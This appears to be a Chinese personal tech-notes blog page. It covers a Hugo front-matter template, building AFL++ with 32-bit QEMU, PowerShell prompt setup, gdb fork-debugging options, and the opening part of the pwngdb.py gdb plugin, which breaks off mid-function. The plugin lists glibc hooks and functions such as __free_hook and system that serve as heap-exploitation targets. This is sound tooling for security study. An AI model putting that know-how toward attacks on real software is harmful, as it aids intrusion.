<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">title: &#34;{{ replace .TranslationBaseName &#34;-&#34; &#34; &#34; | title }}&#34;
</span></span><span class="line"><span class="cl">subtitle: &#34;&#34;
</span></span><span class="line"><span class="cl">date: {{ .Date }}
</span></span><span class="line"><span class="cl">lastmod: {{ .Date }}
</span></span><span class="line"><span class="cl">draft: false
</span></span><span class="line"><span class="cl">toc:
</span></span><span class="line"><span class="cl">  enable: true
</span></span><span class="line"><span class="cl">weight: false
</span></span><span class="line"><span class="cl">categories: [&#34;&#34;]
</span></span><span class="line"><span class="cl">tags: [&#34;&#34;]
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="解决-validation-failed">解决 Validation Failed.</h4>
<p>把页面名称换成英文</p>
<h2 id="afl-qemu-32bit">AFL++ qemu 32bit</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-dev qemu -y 
</span></span><span class="line"><span class="cl">sudo apt install ninja-build
</span></span><span class="line"><span class="cl">sudo apt install gcc-9-plugin-dev
</span></span><span class="line"><span class="cl">sudo apt-get install llvm
</span></span><span class="line"><span class="cl">sudo apt-get install build-essential module-assistant  
</span></span><span class="line"><span class="cl">sudo apt-get install gcc-multilib g++-multilib
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ~
</span></span><span class="line"><span class="cl">git clone https://github.com/AFLplusplus/AFLplusplus
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> AFLplusplus
</span></span><span class="line"><span class="cl">sudo make <span class="o">&amp;&amp;</span> <span class="nb">cd</span> qemu_mode <span class="o">&amp;&amp;</span> <span class="nv">CPU_TARGET</span><span class="o">=</span>i386 ./build_qemu_support.sh <span class="o">&amp;&amp;</span> <span class="nb">cd</span> .. <span class="o">&amp;&amp;</span> sudo make install
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="powershell">powershell</h2>
<h4 id="字体">字体</h4>
<p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.nerdfonts.com%2Ffont-downloads" target="_blank" rel="noopener noreffer ">Nerd Fonts - Iconic font aggregator, glyphs/icons collection, &amp; fonts patcher</a>。</p>
<h4 id="安装oh-my-poshposh-git和readline">安装oh-my-posh，posh-git和Readline</h4>
<p>请运行下列的命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Install-Module</span> <span class="n">-Name</span> <span class="n">PowerShellGet</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl"><span class="n">winget</span> <span class="n">install</span> <span class="n">JanDeDobbeleer</span><span class="p">.</span><span class="py">OhMyPosh</span> <span class="n">-s</span> <span class="n">winget</span>
</span></span><span class="line"><span class="cl"><span class="n">PowerShellGet</span><span class="p">\</span><span class="nb">Install-Module</span> <span class="nb">posh-git</span> <span class="n">-Scope</span> <span class="n">CurrentUser</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl"><span class="nb">Install-Module</span> <span class="n">PSReadLine</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="修改配置文件">修改配置文件</h4>
<p>接下来，我们需要修改我们Powershell的配置文件。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">code <span class="nv">$PROFILE</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们在这个文件中加入下列内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#Set-PSReadLineKeyHandler -Key Tab -Function MenuComplete #Tab键会出现自动补全菜单</span>
</span></span><span class="line"><span class="cl"><span class="c">#Set-PSReadlineKeyHandler -Key UpArrow -Function HistorySearchBackward</span>
</span></span><span class="line"><span class="cl"><span class="c">#Set-PSReadlineKeyHandler -Key DownArrow -Function HistorySearchForward</span>
</span></span><span class="line"><span class="cl"><span class="c"># 上下方向键箭头，搜索历史中进行自动补全</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#oh-my-posh init pwsh --config &#34;$env:POSH_THEMES_PATH/kali.omp.json&#34; | Invoke-Expression</span>
</span></span><span class="line"><span class="cl"><span class="c"># Import-Module posh-git # git的自动补全</span>
</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">PSReadLine</span>
</span></span><span class="line"><span class="cl"><span class="nb">Set-PSReadLineOption</span> <span class="n">-PredictionSource</span> <span class="nb">History
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gdb调试相关">gdb调试相关</h2>
<h3 id="父子进程调试">父子进程调试</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set follow-fork-mode parent
</span></span><span class="line"><span class="cl">set detach-on-fork on
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>on: 断开调试follow-fork-mode指定的进程。</li>
<li>off: gdb将控制父进程和子进程。follow-fork-mode指定的进程将被调试，另一个进程置于暂停（suspended）状态。</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pt/o struct
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwngdbpy">pwngdb.py</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span><span class="lnt">373
</span><span class="lnt">374
</span><span class="lnt">375
</span><span class="lnt">376
</span><span class="lnt">377
</span><span class="lnt">378
</span><span class="lnt">379
</span><span class="lnt">380
</span><span class="lnt">381
</span><span class="lnt">382
</span><span class="lnt">383
</span><span class="lnt">384
</span><span class="lnt">385
</span><span class="lnt">386
</span><span class="lnt">387
</span><span class="lnt">388
</span><span class="lnt">389
</span><span class="lnt">390
</span><span class="lnt">391
</span><span class="lnt">392
</span><span class="lnt">393
</span><span class="lnt">394
</span><span class="lnt">395
</span><span class="lnt">396
</span><span class="lnt">397
</span><span class="lnt">398
</span><span class="lnt">399
</span><span class="lnt">400
</span><span class="lnt">401
</span><span class="lnt">402
</span><span class="lnt">403
</span><span class="lnt">404
</span><span class="lnt">405
</span><span class="lnt">406
</span><span class="lnt">407
</span><span class="lnt">408
</span><span class="lnt">409
</span><span class="lnt">410
</span><span class="lnt">411
</span><span class="lnt">412
</span><span class="lnt">413
</span><span class="lnt">414
</span><span class="lnt">415
</span><span class="lnt">416
</span><span class="lnt">417
</span><span class="lnt">418
</span><span class="lnt">419
</span><span class="lnt">420
</span><span class="lnt">421
</span><span class="lnt">422
</span><span class="lnt">423
</span><span class="lnt">424
</span><span class="lnt">425
</span><span class="lnt">426
</span><span class="lnt">427
</span><span class="lnt">428
</span><span class="lnt">429
</span><span class="lnt">430
</span><span class="lnt">431
</span><span class="lnt">432
</span><span class="lnt">433
</span><span class="lnt">434
</span><span class="lnt">435
</span><span class="lnt">436
</span><span class="lnt">437
</span><span class="lnt">438
</span><span class="lnt">439
</span><span class="lnt">440
</span><span class="lnt">441
</span><span class="lnt">442
</span><span class="lnt">443
</span><span class="lnt">444
</span><span class="lnt">445
</span><span class="lnt">446
</span><span class="lnt">447
</span><span class="lnt">448
</span><span class="lnt">449
</span><span class="lnt">450
</span><span class="lnt">451
</span><span class="lnt">452
</span><span class="lnt">453
</span><span class="lnt">454
</span><span class="lnt">455
</span><span class="lnt">456
</span><span class="lnt">457
</span><span class="lnt">458
</span><span class="lnt">459
</span><span class="lnt">460
</span><span class="lnt">461
</span><span class="lnt">462
</span><span class="lnt">463
</span><span class="lnt">464
</span><span class="lnt">465
</span><span class="lnt">466
</span><span class="lnt">467
</span><span class="lnt">468
</span><span class="lnt">469
</span><span class="lnt">470
</span><span class="lnt">471
</span><span class="lnt">472
</span><span class="lnt">473
</span><span class="lnt">474
</span><span class="lnt">475
</span><span class="lnt">476
</span><span class="lnt">477
</span><span class="lnt">478
</span><span class="lnt">479
</span><span class="lnt">480
</span><span class="lnt">481
</span><span class="lnt">482
</span><span class="lnt">483
</span><span class="lnt">484
</span><span class="lnt">485
</span><span class="lnt">486
</span><span class="lnt">487
</span><span class="lnt">488
</span><span class="lnt">489
</span><span class="lnt">490
</span><span class="lnt">491
</span><span class="lnt">492
</span><span class="lnt">493
</span><span class="lnt">494
</span><span class="lnt">495
</span><span class="lnt">496
</span><span class="lnt">497
</span><span class="lnt">498
</span><span class="lnt">499
</span><span class="lnt">500
</span><span class="lnt">501
</span><span class="lnt">502
</span><span class="lnt">503
</span><span class="lnt">504
</span><span class="lnt">505
</span><span class="lnt">506
</span><span class="lnt">507
</span><span class="lnt">508
</span><span class="lnt">509
</span><span class="lnt">510
</span><span class="lnt">511
</span><span class="lnt">512
</span><span class="lnt">513
</span><span class="lnt">514
</span><span class="lnt">515
</span><span class="lnt">516
</span><span class="lnt">517
</span><span class="lnt">518
</span><span class="lnt">519
</span><span class="lnt">520
</span><span class="lnt">521
</span><span class="lnt">522
</span><span class="lnt">523
</span><span class="lnt">524
</span><span class="lnt">525
</span><span class="lnt">526
</span><span class="lnt">527
</span><span class="lnt">528
</span><span class="lnt">529
</span><span class="lnt">530
</span><span class="lnt">531
</span><span class="lnt">532
</span><span class="lnt">533
</span><span class="lnt">534
</span><span class="lnt">535
</span><span class="lnt">536
</span><span class="lnt">537
</span><span class="lnt">538
</span><span class="lnt">539
</span><span class="lnt">540
</span><span class="lnt">541
</span><span class="lnt">542
</span><span class="lnt">543
</span><span class="lnt">544
</span><span class="lnt">545
</span><span class="lnt">546
</span><span class="lnt">547
</span><span class="lnt">548
</span><span class="lnt">549
</span><span class="lnt">550
</span><span class="lnt">551
</span><span class="lnt">552
</span><span class="lnt">553
</span><span class="lnt">554
</span><span class="lnt">555
</span><span class="lnt">556
</span><span class="lnt">557
</span><span class="lnt">558
</span><span class="lnt">559
</span><span class="lnt">560
</span><span class="lnt">561
</span><span class="lnt">562
</span><span class="lnt">563
</span><span class="lnt">564
</span><span class="lnt">565
</span><span class="lnt">566
</span><span class="lnt">567
</span><span class="lnt">568
</span><span class="lnt">569
</span><span class="lnt">570
</span><span class="lnt">571
</span><span class="lnt">572
</span><span class="lnt">573
</span><span class="lnt">574
</span><span class="lnt">575
</span><span class="lnt">576
</span><span class="lnt">577
</span><span class="lnt">578
</span><span class="lnt">579
</span><span class="lnt">580
</span><span class="lnt">581
</span><span class="lnt">582
</span><span class="lnt">583
</span><span class="lnt">584
</span><span class="lnt">585
</span><span class="lnt">586
</span><span class="lnt">587
</span><span class="lnt">588
</span><span class="lnt">589
</span><span class="lnt">590
</span><span class="lnt">591
</span><span class="lnt">592
</span><span class="lnt">593
</span><span class="lnt">594
</span><span class="lnt">595
</span><span class="lnt">596
</span><span class="lnt">597
</span><span class="lnt">598
</span><span class="lnt">599
</span><span class="lnt">600
</span><span class="lnt">601
</span><span class="lnt">602
</span><span class="lnt">603
</span><span class="lnt">604
</span><span class="lnt">605
</span><span class="lnt">606
</span><span class="lnt">607
</span><span class="lnt">608
</span><span class="lnt">609
</span><span class="lnt">610
</span><span class="lnt">611
</span><span class="lnt">612
</span><span class="lnt">613
</span><span class="lnt">614
</span><span class="lnt">615
</span><span class="lnt">616
</span><span class="lnt">617
</span><span class="lnt">618
</span><span class="lnt">619
</span><span class="lnt">620
</span><span class="lnt">621
</span><span class="lnt">622
</span><span class="lnt">623
</span><span class="lnt">624
</span><span class="lnt">625
</span><span class="lnt">626
</span><span class="lnt">627
</span><span class="lnt">628
</span><span class="lnt">629
</span><span class="lnt">630
</span><span class="lnt">631
</span><span class="lnt">632
</span><span class="lnt">633
</span><span class="lnt">634
</span><span class="lnt">635
</span><span class="lnt">636
</span><span class="lnt">637
</span><span class="lnt">638
</span><span class="lnt">639
</span><span class="lnt">640
</span><span class="lnt">641
</span><span class="lnt">642
</span><span class="lnt">643
</span><span class="lnt">644
</span><span class="lnt">645
</span><span class="lnt">646
</span><span class="lnt">647
</span><span class="lnt">648
</span><span class="lnt">649
</span><span class="lnt">650
</span><span class="lnt">651
</span><span class="lnt">652
</span><span class="lnt">653
</span><span class="lnt">654
</span><span class="lnt">655
</span><span class="lnt">656
</span><span class="lnt">657
</span><span class="lnt">658
</span><span class="lnt">659
</span><span class="lnt">660
</span><span class="lnt">661
</span><span class="lnt">662
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gdb</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">copy</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">directory</span><span class="p">,</span> <span class="n">file</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">directory</span>       <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">expanduser</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">directory</span>       <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">directory</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#sys.path.append(directory)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># arch</span>
</span></span><span class="line"><span class="cl"><span class="n">capsize</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">word</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">magic_variable</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;__malloc_hook&#34;</span><span class="p">,</span><span class="s2">&#34;__free_hook&#34;</span><span class="p">,</span><span class="s2">&#34;_IO_2_1_stdin_&#34;</span><span class="p">,</span><span class="s2">&#34;_IO_2_1_stdout_&#34;</span><span class="p">,</span><span class="s2">&#34;_IO_2_1_stderr_&#34;</span><span class="p">,</span><span class="s2">&#34;_IO_list_all&#34;</span><span class="p">,</span><span class="s2">&#34;__after_morecore_hook&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">magic_function</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">,</span><span class="s2">&#34;execve&#34;</span><span class="p">,</span><span class="s2">&#34;open&#34;</span><span class="p">,</span><span class="s2">&#34;read&#34;</span><span class="p">,</span><span class="s2">&#34;write&#34;</span><span class="p">,</span><span class="s2">&#34;gets&#34;</span><span class="p">,</span><span class="s2">&#34;setcontext&#34;</span><span class="p">,</span><span class="s2">&#34;__libc_realloc&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">to_int</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    Convert a string to int number
</span></span></span><span class="line"><span class="cl"><span class="s2">    from https://github.com/longld/peda
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">normalize_argv</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    Normalize argv to list with predefined length
</span></span></span><span class="line"><span class="cl"><span class="s2">    from https://github.com/longld/peda
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">to_int</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">args</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">to_int</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">size</span> <span class="ow">and</span> <span class="n">idx</span> <span class="o">==</span> <span class="n">size</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">args</span><span class="p">[:</span><span class="n">idx</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">args</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">),</span> <span class="n">size</span><span class="p">):</span>
